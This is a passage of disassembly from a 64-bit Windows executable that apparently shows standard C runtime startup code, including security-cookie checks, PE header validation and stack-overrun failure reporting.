   1400086e5:	48 8b d9             	mov    %rcx,%rbx
   1400086e8:	48 3b c8             	cmp    %rax,%rcx
   1400086eb:	48 0f 42 d8          	cmovb  %rax,%rbx
   1400086ef:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   1400086f3:	48 85 c9             	test   %rcx,%rcx
   1400086f6:	75 04                	jne    0x1400086fc
   1400086f8:	33 ff                	xor    %edi,%edi
   1400086fa:	eb 49                	jmp    0x140008745
   1400086fc:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   140008703:	72 38                	jb     0x14000873d
   140008705:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140008709:	48 3b c1             	cmp    %rcx,%rax
   14000870c:	0f 86 ba 00 00 00    	jbe    0x1400087cc
   140008712:	eb 0e                	jmp    0x140008722
   140008714:	48 b8 00 00 00 00 00 	movabs $0x8000000000000000,%rax
   14000871b:	00 00 80 
   14000871e:	48 83 c0 27          	add    $0x27,%rax
   140008722:	48 8b c8             	mov    %rax,%rcx
   140008725:	e8 f6 00 00 00       	call   0x140008820
   14000872a:	48 85 c0             	test   %rax,%rax
   14000872d:	74 7d                	je     0x1400087ac
   14000872f:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140008733:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140008737:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   14000873b:	eb 08                	jmp    0x140008745
   14000873d:	e8 de 00 00 00       	call   0x140008820
   140008742:	48 8b f8             	mov    %rax,%rdi
   140008745:	4c 8b c5             	mov    %rbp,%r8
   140008748:	48 89 6e 10          	mov    %rbp,0x10(%rsi)
   14000874c:	49 8b d7             	mov    %r15,%rdx
   14000874f:	48 89 5e 18          	mov    %rbx,0x18(%rsi)
   140008753:	48 8b cf             	mov    %rdi,%rcx
   140008756:	e8 30 10 00 00       	call   0x14000978b
   14000875b:	c6 04 2f 00          	movb   $0x0,(%rdi,%rbp,1)
   14000875f:	49 83 fe 0f          	cmp    $0xf,%r14
   140008763:	76 2d                	jbe    0x140008792
   140008765:	48 8b 0e             	mov    (%rsi),%rcx
   140008768:	49 8d 56 01          	lea    0x1(%r14),%rdx
   14000876c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140008773:	72 18                	jb     0x14000878d
   140008775:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140008779:	48 83 c2 27          	add    $0x27,%rdx
   14000877d:	48 2b c8             	sub    %rax,%rcx
   140008780:	48 83 e9 08          	sub    $0x8,%rcx
   140008784:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140008788:	77 22                	ja     0x1400087ac
   14000878a:	48 8b c8             	mov    %rax,%rcx
   14000878d:	e8 0a 03 00 00       	call   0x140008a9c
   140008792:	48 89 3e             	mov    %rdi,(%rsi)
   140008795:	48 8b c6             	mov    %rsi,%rax
   140008798:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   14000879d:	4c 8b 74 24 30       	mov    0x30(%rsp),%r14
   1400087a2:	48 83 c4 38          	add    $0x38,%rsp
   1400087a6:	41 5f                	pop    %r15
   1400087a8:	5e                   	pop    %rsi
   1400087a9:	5d                   	pop    %rbp
   1400087aa:	5b                   	pop    %rbx
   1400087ab:	c3                   	ret
   1400087ac:	45 33 c9             	xor    %r9d,%r9d
   1400087af:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400087b6:	00 00 
   1400087b8:	45 33 c0             	xor    %r8d,%r8d
   1400087bb:	33 d2                	xor    %edx,%edx
   1400087bd:	33 c9                	xor    %ecx,%ecx
   1400087bf:	ff 15 8b 2b 00 00    	call   *0x2b8b(%rip)        # 0x14000b350
   1400087c5:	cc                   	int3
   1400087c6:	e8 15 8f ff ff       	call   0x1400016e0
   1400087cb:	cc                   	int3
   1400087cc:	e8 6f 8e ff ff       	call   0x140001640
   1400087d1:	cc                   	int3
   1400087d2:	cc                   	int3
   1400087d3:	cc                   	int3
   1400087d4:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   1400087d8:	48 2b c8             	sub    %rax,%rcx
   1400087db:	e9 60 f0 ff ff       	jmp    0x140007840
   1400087e0:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   1400087e4:	48 2b c8             	sub    %rax,%rcx
   1400087e7:	e9 24 f1 ff ff       	jmp    0x140007910
   1400087ec:	cc                   	int3
   1400087ed:	cc                   	int3
   1400087ee:	cc                   	int3
   1400087ef:	cc                   	int3
   1400087f0:	cc                   	int3
   1400087f1:	cc                   	int3
   1400087f2:	cc                   	int3
   1400087f3:	cc                   	int3
   1400087f4:	cc                   	int3
   1400087f5:	cc                   	int3
   1400087f6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400087fd:	00 00 00 
   140008800:	48 3b 0d 39 98 00 00 	cmp    0x9839(%rip),%rcx        # 0x140012040
   140008807:	75 10                	jne    0x140008819
   140008809:	48 c1 c1 10          	rol    $0x10,%rcx
   14000880d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140008812:	75 01                	jne    0x140008815
   140008814:	c3                   	ret
   140008815:	48 c1 c9 10          	ror    $0x10,%rcx
   140008819:	e9 5a 05 00 00       	jmp    0x140008d78
   14000881e:	cc                   	int3
   14000881f:	cc                   	int3
   140008820:	40 53                	rex push %rbx
   140008822:	48 83 ec 20          	sub    $0x20,%rsp
   140008826:	48 8b d9             	mov    %rcx,%rbx
   140008829:	eb 0f                	jmp    0x14000883a
   14000882b:	48 8b cb             	mov    %rbx,%rcx
   14000882e:	e8 5e 0f 00 00       	call   0x140009791
   140008833:	85 c0                	test   %eax,%eax
   140008835:	74 13                	je     0x14000884a
   140008837:	48 8b cb             	mov    %rbx,%rcx
   14000883a:	e8 58 0f 00 00       	call   0x140009797
   14000883f:	48 85 c0             	test   %rax,%rax
   140008842:	74 e7                	je     0x14000882b
   140008844:	48 83 c4 20          	add    $0x20,%rsp
   140008848:	5b                   	pop    %rbx
   140008849:	c3                   	ret
   14000884a:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   14000884e:	74 06                	je     0x140008856
   140008850:	e8 8f 06 00 00       	call   0x140008ee4
   140008855:	cc                   	int3
   140008856:	e8 e5 8d ff ff       	call   0x140001640
   14000885b:	cc                   	int3
   14000885c:	48 83 ec 28          	sub    $0x28,%rsp
   140008860:	e8 3f 09 00 00       	call   0x1400091a4
   140008865:	85 c0                	test   %eax,%eax
   140008867:	74 21                	je     0x14000888a
   140008869:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140008870:	00 00 
   140008872:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140008876:	eb 05                	jmp    0x14000887d
   140008878:	48 3b c8             	cmp    %rax,%rcx
   14000887b:	74 14                	je     0x140008891
   14000887d:	33 c0                	xor    %eax,%eax
   14000887f:	f0 48 0f b1 0d d0 75 	lock cmpxchg %rcx,0x175d0(%rip)        # 0x14001fe58
   140008886:	01 00 
   140008888:	75 ee                	jne    0x140008878
   14000888a:	32 c0                	xor    %al,%al
   14000888c:	48 83 c4 28          	add    $0x28,%rsp
   140008890:	c3                   	ret
   140008891:	b0 01                	mov    $0x1,%al
   140008893:	eb f7                	jmp    0x14000888c
   140008895:	cc                   	int3
   140008896:	cc                   	int3
   140008897:	cc                   	int3
   140008898:	48 83 ec 28          	sub    $0x28,%rsp
   14000889c:	85 c9                	test   %ecx,%ecx
   14000889e:	75 07                	jne    0x1400088a7
   1400088a0:	c6 05 b9 75 01 00 01 	movb   $0x1,0x175b9(%rip)        # 0x14001fe60
   1400088a7:	e8 58 06 00 00       	call   0x140008f04
   1400088ac:	e8 ff 0b 00 00       	call   0x1400094b0
   1400088b1:	84 c0                	test   %al,%al
   1400088b3:	75 04                	jne    0x1400088b9
   1400088b5:	32 c0                	xor    %al,%al
   1400088b7:	eb 14                	jmp    0x1400088cd
   1400088b9:	e8 f2 0b 00 00       	call   0x1400094b0
   1400088be:	84 c0                	test   %al,%al
   1400088c0:	75 09                	jne    0x1400088cb
   1400088c2:	33 c9                	xor    %ecx,%ecx
   1400088c4:	e8 e7 0b 00 00       	call   0x1400094b0
   1400088c9:	eb ea                	jmp    0x1400088b5
   1400088cb:	b0 01                	mov    $0x1,%al
   1400088cd:	48 83 c4 28          	add    $0x28,%rsp
   1400088d1:	c3                   	ret
   1400088d2:	cc                   	int3
   1400088d3:	cc                   	int3
   1400088d4:	40 53                	rex push %rbx
   1400088d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400088da:	80 3d 80 75 01 00 00 	cmpb   $0x0,0x17580(%rip)        # 0x14001fe61
   1400088e1:	8b d9                	mov    %ecx,%ebx
   1400088e3:	75 67                	jne    0x14000894c
   1400088e5:	83 f9 01             	cmp    $0x1,%ecx
   1400088e8:	77 6a                	ja     0x140008954
   1400088ea:	e8 b5 08 00 00       	call   0x1400091a4
   1400088ef:	85 c0                	test   %eax,%eax
   1400088f1:	74 28                	je     0x14000891b
   1400088f3:	85 db                	test   %ebx,%ebx
   1400088f5:	75 24                	jne    0x14000891b
   1400088f7:	48 8d 0d 6a 75 01 00 	lea    0x1756a(%rip),%rcx        # 0x14001fe68
   1400088fe:	e8 a6 0e 00 00       	call   0x1400097a9
   140008903:	85 c0                	test   %eax,%eax
   140008905:	75 10                	jne    0x140008917
   140008907:	48 8d 0d 72 75 01 00 	lea    0x17572(%rip),%rcx        # 0x14001fe80
   14000890e:	e8 96 0e 00 00       	call   0x1400097a9
   140008913:	85 c0                	test   %eax,%eax
   140008915:	74 2e                	je     0x140008945
   140008917:	32 c0                	xor    %al,%al
   140008919:	eb 33                	jmp    0x14000894e
   14000891b:	66 0f 6f 05 fd 2b 00 	movdqa 0x2bfd(%rip),%xmm0        # 0x14000b520
   140008922:	00 
   140008923:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140008927:	f3 0f 7f 05 39 75 01 	movdqu %xmm0,0x17539(%rip)        # 0x14001fe68
   14000892e:	00 
   14000892f:	48 89 05 42 75 01 00 	mov    %rax,0x17542(%rip)        # 0x14001fe78
   140008936:	f3 0f 7f 05 42 75 01 	movdqu %xmm0,0x17542(%rip)        # 0x14001fe80
   14000893d:	00 
   14000893e:	48 89 05 4b 75 01 00 	mov    %rax,0x1754b(%rip)        # 0x14001fe90
   140008945:	c6 05 15 75 01 00 01 	movb   $0x1,0x17515(%rip)        # 0x14001fe61
   14000894c:	b0 01                	mov    $0x1,%al
   14000894e:	48 83 c4 20          	add    $0x20,%rsp
   140008952:	5b                   	pop    %rbx
   140008953:	c3                   	ret
   140008954:	b9 05 00 00 00       	mov    $0x5,%ecx
   140008959:	e8 5e 08 00 00       	call   0x1400091bc
   14000895e:	cc                   	int3
   14000895f:	cc                   	int3
   140008960:	48 83 ec 18          	sub    $0x18,%rsp
   140008964:	4c 8b c1             	mov    %rcx,%r8
   140008967:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000896c:	66 39 05 8d 76 ff ff 	cmp    %ax,-0x8973(%rip)        # 0x140000000
   140008973:	75 78                	jne    0x1400089ed
   140008975:	48 63 0d c0 76 ff ff 	movslq -0x8940(%rip),%rcx        # 0x14000003c
   14000897c:	48 8d 15 7d 76 ff ff 	lea    -0x8983(%rip),%rdx        # 0x140000000
   140008983:	48 03 ca             	add    %rdx,%rcx
   140008986:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000898c:	75 5f                	jne    0x1400089ed
   14000898e:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140008993:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140008997:	75 54                	jne    0x1400089ed
   140008999:	4c 2b c2             	sub    %rdx,%r8
   14000899c:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   1400089a0:	48 83 c2 18          	add    $0x18,%rdx
   1400089a4:	48 03 d1             	add    %rcx,%rdx
   1400089a7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   1400089ab:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400089af:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   1400089b3:	48 89 14 24          	mov    %rdx,(%rsp)
   1400089b7:	49 3b d1             	cmp    %r9,%rdx
   1400089ba:	74 18                	je     0x1400089d4
   1400089bc:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   1400089bf:	4c 3b c1             	cmp    %rcx,%r8
   1400089c2:	72 0a                	jb     0x1400089ce
   1400089c4:	8b 42 08             	mov    0x8(%rdx),%eax
   1400089c7:	03 c1                	add    %ecx,%eax
   1400089c9:	4c 3b c0             	cmp    %rax,%r8
   1400089cc:	72 08                	jb     0x1400089d6
   1400089ce:	48 83 c2 28          	add    $0x28,%rdx
   1400089d2:	eb df                	jmp    0x1400089b3
   1400089d4:	33 d2                	xor    %edx,%edx
   1400089d6:	48 85 d2             	test   %rdx,%rdx
   1400089d9:	75 04                	jne    0x1400089df
   1400089db:	32 c0                	xor    %al,%al
   1400089dd:	eb 14                	jmp    0x1400089f3
   1400089df:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   1400089e3:	7d 04                	jge    0x1400089e9
   1400089e5:	32 c0                	xor    %al,%al
   1400089e7:	eb 0a                	jmp    0x1400089f3
   1400089e9:	b0 01                	mov    $0x1,%al
   1400089eb:	eb 06                	jmp    0x1400089f3
   1400089ed:	32 c0                	xor    %al,%al
   1400089ef:	eb 02                	jmp    0x1400089f3
   1400089f1:	32 c0                	xor    %al,%al
   1400089f3:	48 83 c4 18          	add    $0x18,%rsp
   1400089f7:	c3                   	ret
   1400089f8:	40 53                	rex push %rbx
   1400089fa:	48 83 ec 20          	sub    $0x20,%rsp
   1400089fe:	8a d9                	mov    %cl,%bl
   140008a00:	e8 9f 07 00 00       	call   0x1400091a4
   140008a05:	33 d2                	xor    %edx,%edx
   140008a07:	85 c0                	test   %eax,%eax
   140008a09:	74 0b                	je     0x140008a16
   140008a0b:	84 db                	test   %bl,%bl
   140008a0d:	75 07                	jne    0x140008a16
   140008a0f:	48 87 15 42 74 01 00 	xchg   %rdx,0x17442(%rip)        # 0x14001fe58
   140008a16:	48 83 c4 20          	add    $0x20,%rsp
   140008a1a:	5b                   	pop    %rbx
   140008a1b:	c3                   	ret
   140008a1c:	40 53                	rex push %rbx
   140008a1e:	48 83 ec 20          	sub    $0x20,%rsp
   140008a22:	80 3d 37 74 01 00 00 	cmpb   $0x0,0x17437(%rip)        # 0x14001fe60
   140008a29:	8a d9                	mov    %cl,%bl
   140008a2b:	74 04                	je     0x140008a31
   140008a2d:	84 d2                	test   %dl,%dl
   140008a2f:	75 0c                	jne    0x140008a3d
   140008a31:	e8 7a 0a 00 00       	call   0x1400094b0
   140008a36:	8a cb                	mov    %bl,%cl
   140008a38:	e8 73 0a 00 00       	call   0x1400094b0
   140008a3d:	b0 01                	mov    $0x1,%al
   140008a3f:	48 83 c4 20          	add    $0x20,%rsp
   140008a43:	5b                   	pop    %rbx
   140008a44:	c3                   	ret
   140008a45:	cc                   	int3
   140008a46:	cc                   	int3
   140008a47:	cc                   	int3
   140008a48:	40 53                	rex push %rbx
   140008a4a:	48 83 ec 20          	sub    $0x20,%rsp
   140008a4e:	48 83 3d 12 74 01 00 	cmpq   $0xffffffffffffffff,0x17412(%rip)        # 0x14001fe68
   140008a55:	ff 
   140008a56:	48 8b d9             	mov    %rcx,%rbx
   140008a59:	75 07                	jne    0x140008a62
   140008a5b:	e8 55 0d 00 00       	call   0x1400097b5
   140008a60:	eb 0f                	jmp    0x140008a71
   140008a62:	48 8b d3             	mov    %rbx,%rdx
   140008a65:	48 8d 0d fc 73 01 00 	lea    0x173fc(%rip),%rcx        # 0x14001fe68
   140008a6c:	e8 3e 0d 00 00       	call   0x1400097af
   140008a71:	33 d2                	xor    %edx,%edx
   140008a73:	85 c0                	test   %eax,%eax
   140008a75:	48 0f 44 d3          	cmove  %rbx,%rdx
   140008a79:	48 8b c2             	mov    %rdx,%rax
   140008a7c:	48 83 c4 20          	add    $0x20,%rsp
   140008a80:	5b                   	pop    %rbx
   140008a81:	c3                   	ret
   140008a82:	cc                   	int3
   140008a83:	cc                   	int3
   140008a84:	48 83 ec 28          	sub    $0x28,%rsp
   140008a88:	e8 bb ff ff ff       	call   0x140008a48
   140008a8d:	48 f7 d8             	neg    %rax
   140008a90:	1b c0                	sbb    %eax,%eax
   140008a92:	f7 d8                	neg    %eax
   140008a94:	ff c8                	dec    %eax
   140008a96:	48 83 c4 28          	add    $0x28,%rsp
   140008a9a:	c3                   	ret
   140008a9b:	cc                   	int3
   140008a9c:	e9 3f 09 00 00       	jmp    0x1400093e0
   140008aa1:	cc                   	int3
   140008aa2:	cc                   	int3
   140008aa3:	cc                   	int3
   140008aa4:	40 53                	rex push %rbx
   140008aa6:	48 83 ec 20          	sub    $0x20,%rsp
   140008aaa:	48 8d 05 87 2a 00 00 	lea    0x2a87(%rip),%rax        # 0x14000b538
   140008ab1:	48 8b d9             	mov    %rcx,%rbx
   140008ab4:	48 89 01             	mov    %rax,(%rcx)
   140008ab7:	f6 c2 01             	test   $0x1,%dl
   140008aba:	74 0a                	je     0x140008ac6
   140008abc:	ba 18 00 00 00       	mov    $0x18,%edx
   140008ac1:	e8 d6 ff ff ff       	call   0x140008a9c
   140008ac6:	48 8b c3             	mov    %rbx,%rax
   140008ac9:	48 83 c4 20          	add    $0x20,%rsp
   140008acd:	5b                   	pop    %rbx
   140008ace:	c3                   	ret
   140008acf:	cc                   	int3
   140008ad0:	40 53                	rex push %rbx
   140008ad2:	48 83 ec 20          	sub    $0x20,%rsp
   140008ad6:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008adb:	e8 e7 0c 00 00       	call   0x1400097c7
   140008ae0:	e8 b3 09 00 00       	call   0x140009498
   140008ae5:	8b c8                	mov    %eax,%ecx
   140008ae7:	e8 05 0d 00 00       	call   0x1400097f1
   140008aec:	e8 1f 08 00 00       	call   0x140009310
   140008af1:	8b d8                	mov    %eax,%ebx
   140008af3:	e8 23 0d 00 00       	call   0x14000981b
   140008af8:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008afd:	89 18                	mov    %ebx,(%rax)
   140008aff:	e8 d0 fd ff ff       	call   0x1400088d4
   140008b04:	84 c0                	test   %al,%al
   140008b06:	74 73                	je     0x140008b7b
   140008b08:	e8 ef 09 00 00       	call   0x1400094fc
   140008b0d:	48 8d 0d 24 0a 00 00 	lea    0xa24(%rip),%rcx        # 0x140009538
   140008b14:	e8 6b ff ff ff       	call   0x140008a84
   140008b19:	e8 7e 06 00 00       	call   0x14000919c
   140008b1e:	8b c8                	mov    %eax,%ecx
   140008b20:	e8 78 0c 00 00       	call   0x14000979d
   140008b25:	85 c0                	test   %eax,%eax
   140008b27:	75 52                	jne    0x140008b7b
   140008b29:	e8 72 09 00 00       	call   0x1400094a0
   140008b2e:	e8 ad 09 00 00       	call   0x1400094e0
   140008b33:	85 c0                	test   %eax,%eax
   140008b35:	74 0c                	je     0x140008b43
   140008b37:	48 8d 0d d2 07 00 00 	lea    0x7d2(%rip),%rcx        # 0x140009310
   140008b3e:	e8 8a 0c 00 00       	call   0x1400097cd
   140008b43:	e8 94 08 00 00       	call   0x1400093dc
   140008b48:	e8 8f 08 00 00       	call   0x1400093dc
   140008b4d:	e8 be 07 00 00       	call   0x140009310
   140008b52:	8b c8                	mov    %eax,%ecx
   140008b54:	e8 b6 0c 00 00       	call   0x14000980f
   140008b59:	e8 52 09 00 00       	call   0x1400094b0
   140008b5e:	84 c0                	test   %al,%al
   140008b60:	74 05                	je     0x140008b67
   140008b62:	e8 3c 0c 00 00       	call   0x1400097a3
   140008b67:	e8 a4 07 00 00       	call   0x140009310
   140008b6c:	e8 97 07 00 00       	call   0x140009308
   140008b71:	85 c0                	test   %eax,%eax
   140008b73:	75 06                	jne    0x140008b7b
   140008b75:	48 83 c4 20          	add    $0x20,%rsp
   140008b79:	5b                   	pop    %rbx
   140008b7a:	c3                   	ret
   140008b7b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008b80:	e8 37 06 00 00       	call   0x1400091bc
   140008b85:	cc                   	int3
   140008b86:	cc                   	int3
   140008b87:	cc                   	int3
   140008b88:	48 83 ec 28          	sub    $0x28,%rsp
   140008b8c:	e8 33 09 00 00       	call   0x1400094c4
   140008b91:	33 c0                	xor    %eax,%eax
   140008b93:	48 83 c4 28          	add    $0x28,%rsp
   140008b97:	c3                   	ret
   140008b98:	48 83 ec 28          	sub    $0x28,%rsp
   140008b9c:	e8 c7 07 00 00       	call   0x140009368
   140008ba1:	e8 6a 07 00 00       	call   0x140009310
   140008ba6:	8b c8                	mov    %eax,%ecx
   140008ba8:	48 83 c4 28          	add    $0x28,%rsp
   140008bac:	e9 64 0c 00 00       	jmp    0x140009815
   140008bb1:	cc                   	int3
   140008bb2:	cc                   	int3
   140008bb3:	cc                   	int3
   140008bb4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008bb9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008bbe:	57                   	push   %rdi
   140008bbf:	48 83 ec 30          	sub    $0x30,%rsp
   140008bc3:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008bc8:	e8 cb fc ff ff       	call   0x140008898
   140008bcd:	84 c0                	test   %al,%al
   140008bcf:	0f 84 36 01 00 00    	je     0x140008d0b
   140008bd5:	40 32 f6             	xor    %sil,%sil
   140008bd8:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140008bdd:	e8 7a fc ff ff       	call   0x14000885c
   140008be2:	8a d8                	mov    %al,%bl
   140008be4:	8b 0d 66 72 01 00    	mov    0x17266(%rip),%ecx        # 0x14001fe50
   140008bea:	83 f9 01             	cmp    $0x1,%ecx
   140008bed:	0f 84 23 01 00 00    	je     0x140008d16
   140008bf3:	85 c9                	test   %ecx,%ecx
   140008bf5:	75 4a                	jne    0x140008c41
   140008bf7:	c7 05 4f 72 01 00 01 	movl   $0x1,0x1724f(%rip)        # 0x14001fe50
   140008bfe:	00 00 00 
   140008c01:	48 8d 15 d8 28 00 00 	lea    0x28d8(%rip),%rdx        # 0x14000b4e0
   140008c08:	48 8d 0d b9 28 00 00 	lea    0x28b9(%rip),%rcx        # 0x14000b4c8
   140008c0f:	e8 cb 0b 00 00       	call   0x1400097df
   140008c14:	85 c0                	test   %eax,%eax
   140008c16:	74 0a                	je     0x140008c22
   140008c18:	b8 ff 00 00 00       	mov    $0xff,%eax
   140008c1d:	e9 d9 00 00 00       	jmp    0x140008cfb
   140008c22:	48 8d 15 97 28 00 00 	lea    0x2897(%rip),%rdx        # 0x14000b4c0
   140008c29:	48 8d 0d 08 28 00 00 	lea    0x2808(%rip),%rcx        # 0x14000b438
   140008c30:	e8 a4 0b 00 00       	call   0x1400097d9
   140008c35:	c7 05 11 72 01 00 02 	movl   $0x2,0x17211(%rip)        # 0x14001fe50
   140008c3c:	00 00 00 
   140008c3f:	eb 08                	jmp    0x140008c49
   140008c41:	40 b6 01             	mov    $0x1,%sil
   140008c44:	40 88 74 24 20       	mov    %sil,0x20(%rsp)
   140008c49:	8a cb                	mov    %bl,%cl
   140008c4b:	e8 a8 fd ff ff       	call   0x1400089f8
   140008c50:	e8 97 08 00 00       	call   0x1400094ec
   140008c55:	48 8b d8             	mov    %rax,%rbx
   140008c58:	48 83 38 00          	cmpq   $0x0,(%rax)
   140008c5c:	74 1e                	je     0x140008c7c
   140008c5e:	48 8b c8             	mov    %rax,%rcx
   140008c61:	e8 fa fc ff ff       	call   0x140008960
   140008c66:	84 c0                	test   %al,%al
   140008c68:	74 12                	je     0x140008c7c
   140008c6a:	45 33 c0             	xor    %r8d,%r8d
   140008c6d:	41 8d 50 02          	lea    0x2(%r8),%edx
   140008c71:	33 c9                	xor    %ecx,%ecx
   140008c73:	48 8b 03             	mov    (%rbx),%rax
   140008c76:	ff 15 94 27 00 00    	call   *0x2794(%rip)        # 0x14000b410
   140008c7c:	e8 73 08 00 00       	call   0x1400094f4
   140008c81:	48 8b d8             	mov    %rax,%rbx
   140008c84:	48 83 38 00          	cmpq   $0x0,(%rax)
   140008c88:	74 14                	je     0x140008c9e
   140008c8a:	48 8b c8             	mov    %rax,%rcx
   140008c8d:	e8 ce fc ff ff       	call   0x140008960
   140008c92:	84 c0                	test   %al,%al
   140008c94:	74 08                	je     0x140008c9e
   140008c96:	48 8b 0b             	mov    (%rbx),%rcx
   140008c99:	e8 6b 0b 00 00       	call   0x140009809
   140008c9e:	e8 30 0b 00 00       	call   0x1400097d3
   140008ca3:	48 8b f8             	mov    %rax,%rdi
   140008ca6:	e8 52 0b 00 00       	call   0x1400097fd
   140008cab:	48 8b 18             	mov    (%rax),%rbx
   140008cae:	e8 44 0b 00 00       	call   0x1400097f7
   140008cb3:	4c 8b c7             	mov    %rdi,%r8
   140008cb6:	48 8b d3             	mov    %rbx,%rdx
   140008cb9:	8b 08                	mov    (%rax),%ecx
   140008cbb:	e8 b0 c8 ff ff       	call   0x140005570
   140008cc0:	8b d8                	mov    %eax,%ebx
   140008cc2:	e8 4d 06 00 00       	call   0x140009314
   140008cc7:	84 c0                	test   %al,%al
   140008cc9:	74 55                	je     0x140008d20
   140008ccb:	40 84 f6             	test   %sil,%sil
   140008cce:	75 05                	jne    0x140008cd5
   140008cd0:	e8 e6 0a 00 00       	call   0x1400097bb
   140008cd5:	33 d2                	xor    %edx,%edx
   140008cd7:	b1 01                	mov    $0x1,%cl
   140008cd9:	e8 3e fd ff ff       	call   0x140008a1c
   140008cde:	8b c3                	mov    %ebx,%eax
   140008ce0:	eb 19                	jmp    0x140008cfb
   140008ce2:	8b d8                	mov    %eax,%ebx
   140008ce4:	e8 2b 06 00 00       	call   0x140009314
   140008ce9:	84 c0                	test   %al,%al
   140008ceb:	74 3b                	je     0x140008d28
   140008ced:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140008cf2:	75 05                	jne    0x140008cf9
   140008cf4:	e8 0a 0b 00 00       	call   0x140009803
   140008cf9:	8b c3                	mov    %ebx,%eax
   140008cfb:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140008d00:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140008d05:	48 83 c4 30          	add    $0x30,%rsp
   140008d09:	5f                   	pop    %rdi
   140008d0a:	c3                   	ret
   140008d0b:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008d10:	e8 a7 04 00 00       	call   0x1400091bc
   140008d15:	90                   	nop
   140008d16:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008d1b:	e8 9c 04 00 00       	call   0x1400091bc
   140008d20:	8b cb                	mov    %ebx,%ecx
   140008d22:	e8 be 0a 00 00       	call   0x1400097e5
   140008d27:	90                   	nop
   140008d28:	8b cb                	mov    %ebx,%ecx
   140008d2a:	e8 bc 0a 00 00       	call   0x1400097eb
   140008d2f:	90                   	nop
   140008d30:	48 83 ec 28          	sub    $0x28,%rsp
   140008d34:	e8 af 06 00 00       	call   0x1400093e8
   140008d39:	48 83 c4 28          	add    $0x28,%rsp
   140008d3d:	e9 72 fe ff ff       	jmp    0x140008bb4
   140008d42:	cc                   	int3
   140008d43:	cc                   	int3
   140008d44:	40 53                	rex push %rbx
   140008d46:	48 83 ec 20          	sub    $0x20,%rsp
   140008d4a:	48 8b d9             	mov    %rcx,%rbx
   140008d4d:	33 c9                	xor    %ecx,%ecx
   140008d4f:	ff 15 0b 23 00 00    	call   *0x230b(%rip)        # 0x14000b060
   140008d55:	48 8b cb             	mov    %rbx,%rcx
   140008d58:	ff 15 fa 22 00 00    	call   *0x22fa(%rip)        # 0x14000b058
   140008d5e:	ff 15 04 23 00 00    	call   *0x2304(%rip)        # 0x14000b068
   140008d64:	48 8b c8             	mov    %rax,%rcx
   140008d67:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140008d6c:	48 83 c4 20          	add    $0x20,%rsp
   140008d70:	5b                   	pop    %rbx
   140008d71:	48 ff 25 f8 22 00 00 	rex.W jmp *0x22f8(%rip)        # 0x14000b070
   140008d78:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140008d7d:	48 83 ec 38          	sub    $0x38,%rsp
   140008d81:	b9 17 00 00 00       	mov    $0x17,%ecx
   140008d86:	ff 15 ec 22 00 00    	call   *0x22ec(%rip)        # 0x14000b078
   140008d8c:	85 c0                	test   %eax,%eax
   140008d8e:	74 07                	je     0x140008d97
   140008d90:	b9 02 00 00 00       	mov    $0x2,%ecx
   140008d95:	cd 29                	int    $0x29
   140008d97:	48 8d 0d a2 71 01 00 	lea    0x171a2(%rip),%rcx        # 0x14001ff40
   140008d9e:	e8 a9 00 00 00       	call   0x140008e4c
   140008da3:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140008da8:	48 89 05 89 72 01 00 	mov    %rax,0x17289(%rip)        # 0x140020038
   140008daf:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   140008db4:	48 83 c0 08          	add    $0x8,%rax
   140008db8:	48 89 05 19 72 01 00 	mov    %rax,0x17219(%rip)        # 0x14001ffd8
   140008dbf:	48 8b 05 72 72 01 00 	mov    0x17272(%rip),%rax        # 0x140020038
   140008dc6:	48 89 05 e3 70 01 00 	mov    %rax,0x170e3(%rip)        # 0x14001feb0
   140008dcd:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   140008dd2:	48 89 05 e7 71 01 00 	mov    %rax,0x171e7(%rip)        # 0x14001ffc0
   140008dd9:	c7 05 bd 70 01 00 09 	movl   $0xc0000409,0x170bd(%rip)        # 0x14001fea0
   140008de0:	04 00 c0 
   140008de3:	c7 05 b7 70 01 00 01 	movl   $0x1,0x170b7(%rip)        # 0x14001fea4
   140008dea:	00 00 00 
